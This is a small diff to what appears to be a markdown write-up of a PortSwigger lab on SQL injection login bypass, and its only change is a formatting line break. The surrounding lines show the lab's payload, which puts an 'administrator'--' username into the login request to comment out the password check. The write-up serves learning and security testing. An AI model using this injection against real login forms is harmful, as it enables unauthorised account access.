@@ -27,5 +27,5 @@ Code:<br>
 <br>Payload:
 <br>`username=administrator%27--&password=hello`<br>
 Username field = "adminstrator'--"<br>
-Credit:<br>
+<br>Credit:<br>
 [SQL Login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
